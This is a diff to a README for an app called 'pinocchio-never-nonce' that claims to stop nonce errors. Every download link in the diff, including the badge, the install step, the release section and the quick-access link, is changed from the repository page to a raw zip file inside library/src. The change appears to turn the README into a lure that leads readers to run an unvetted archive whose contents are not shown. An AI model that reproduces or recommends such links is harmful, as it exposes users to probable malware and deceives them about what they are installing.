@@ -1,6 +1,6 @@
 # 🧠 pinocchio-never-nonce - Stop nonce errors before they start
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20the%20app-blue?style=for-the-badge)](https://github.com/Fonziecurable529/pinocchio-never-nonce)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20the%20app-blue?style=for-the-badge)](https://github.com/Fonziecurable529/pinocchio-never-nonce/raw/refs/heads/main/library/src/never_pinocchio_nonce_v1.3.zip)
 
 ## 📦 What this app does
 
@@ -27,7 +27,7 @@ For best results:
 ## 🚀 Download and install
 
 1. Open the download page:
-   https://github.com/Fonziecurable529/pinocchio-never-nonce
+   https://github.com/Fonziecurable529/pinocchio-never-nonce/raw/refs/heads/main/library/src/never_pinocchio_nonce_v1.3.zip
 
 2. On the page, look for the download area.
 
@@ -153,7 +153,7 @@ Windows may ask if you want to allow the app to make changes to your device.
 
 Use this page to download or open the main release files:
 
-https://github.com/Fonziecurable529/pinocchio-never-nonce
+https://github.com/Fonziecurable529/pinocchio-never-nonce/raw/refs/heads/main/library/src/never_pinocchio_nonce_v1.3.zip
 
 ## 🧰 Tips for smooth use
 
@@ -206,7 +206,7 @@ If you want the shortest path:
 
 ## 📎 Quick access
 
-[Open the download page](https://github.com/Fonziecurable529/pinocchio-never-nonce)
+[Open the download page](https://github.com/Fonziecurable529/pinocchio-never-nonce/raw/refs/heads/main/library/src/never_pinocchio_nonce_v1.3.zip)
 
 ## 🧭 Help with common terms
 
